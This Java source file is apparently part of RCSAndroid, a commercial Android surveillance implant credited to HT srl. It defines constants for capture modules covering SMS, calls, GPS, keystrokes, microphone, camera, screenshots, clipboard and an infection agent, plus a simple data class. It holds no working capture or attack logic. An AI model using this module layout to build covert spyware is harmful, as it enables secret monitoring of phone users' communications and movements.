/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 01-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.agent;

/**
 * The Class Agent.
 */
public class Agent {
	
	/** Agents definitions. */
	final public static int AGENT = 0x1000;
	
	/** The Constant AGENT_INFO. */
	final public static int AGENT_INFO = AGENT;
	
	/** The Constant AGENT_SMS. */
	final public static int AGENT_SMS = AGENT + 0x1; // Agente di cattura delle
	// Email/Sms/Mms
	/** The Constant AGENT_TASK. */
	final public static int AGENT_TASK = AGENT + 0x2; // Agente per la cattura
	// degli appuntamenti
	/** The Constant AGENT_CALLLIST. */
	final public static int AGENT_CALLLIST = AGENT + 0x3; // Agente per la
	// cattura della
	// lista delle
	// chiamate
	/** The Constant AGENT_DEVICE. */
	final public static int AGENT_DEVICE = AGENT + 0x4; // Agente per la cattura
	// delle informazioni
	// sul device
	/** The Constant AGENT_POSITION. */
	final public static int AGENT_POSITION = AGENT + 0x5; // Agente per la
	// cattura della
	// posizione GPSo
	// celle GSM
	/** The Constant AGENT_CALL. */
	final public static int AGENT_CALL = AGENT + 0x6; // Agente per la cattura
	// delle chiamate con
	// conference call
	/** The Constant AGENT_CALL_LOCAL. */
	final public static int AGENT_CALL_LOCAL = AGENT + 0x7; // Agente per la
	// registrazione in
	// situ delle
	// chiamate
	/** The Constant AGENT_KEYLOG. */
	final public static int AGENT_KEYLOG = AGENT + 0x8; // Agente per la cattura
	// dei tasti battuti su
	// tastiera
	/** The Constant AGENT_SNAPSHOT. */
	final public static int AGENT_SNAPSHOT = AGENT + 0x9; // Agente per la
	// cattura degli
	// snapshot dello
	// schermo
	/** The Constant AGENT_URL. */
	final public static int AGENT_URL = AGENT + 0xa; // Agente per la cattura
	// degli URL visitati
	/** The Constant AGENT_IM. */
	final public static int AGENT_IM = AGENT + 0xb; // Agente per la cattura
	// degli IM
	/** The Constant AGENT_EMAIL. */
	final public static int AGENT_EMAIL = AGENT + 0xc; // Non utilizzato (fa
	// tutto AGENT_SMS)
	/** The Constant AGENT_MIC. */
	final public static int AGENT_MIC = AGENT + 0xd; // Agente per la cattura
	// del microfono
	/** The Constant AGENT_CAM. */
	final public static int AGENT_CAM = AGENT + 0xe; // Agente per la cattura
	// degli snapshot dalle
	// webcam
	/** The Constant AGENT_CLIPBOARD. */
	final public static int AGENT_CLIPBOARD = AGENT + 0xf; // Agente per la
	// cattura degli
	// appunti
	/** The Constant AGENT_CRISIS. */
	final public static int AGENT_CRISIS = AGENT + 0x10; // Agente di Crisis
	
	/** The Constant AGENT_APPLICATION. */
	final public static int AGENT_APPLICATION = AGENT + 0x11; // Agente per la
	// cattura delle
	// applicazioni
	// avviate o
	// fermate
	/** The Constant AGENT_PDA. */
	final public static int AGENT_PDA = 0xDF7A; // Solo per PC (infection agent)

	/** Agent status definitions. */
	final public static int AGENT_DISABLED = 0x1;
	
	/** The Constant AGENT_ENABLED. */
	final public static int AGENT_ENABLED = 0x2;
	
	/** The Constant AGENT_RUNNING. */
	final public static int AGENT_RUNNING = 0x3;
	
	/** The Constant AGENT_STOPPED. */
	final public static int AGENT_STOPPED = 0x4;

	/** The Constant AGENT_STOP. */
	final public static int AGENT_STOP = AGENT_STOPPED;
	
	/** The Constant AGENT_RELOAD. */
	final public static int AGENT_RELOAD = 0x1;
	
	/** The Constant AGENT_ROTATE. */
	final public static int AGENT_ROTATE = 0x2;

	/** Agent ID. */
	private final int agentId;

	/** Agent status: enabled, disabled, running, stopped. */
	//private int agentStatus;

	/** Parameters. */
	private final byte[] agentParams;

	private boolean agentEnabled;

	/**
	 * Instantiates a new agent.
	 *
	 * @param id the id
	 * @param status the status
	 * @param params the params
	 */
	public Agent(final int id, final boolean enabled, final byte[] params) {
		this.agentId = id;
		//this.agentStatus = AGENT_STOPPED;
		this.agentEnabled = enabled;
		this.agentParams = params;
	}

	/**
	 * Gets the id.
	 *
	 * @return the id
	 */
	public int getId() {
		return this.agentId;
	}

	public boolean isEnabled() {
		return this.agentEnabled;
	}

	/**
	 * Gets the params.
	 *
	 * @return the params
	 */
	public byte[] getParams() {
		return this.agentParams;
	}
}
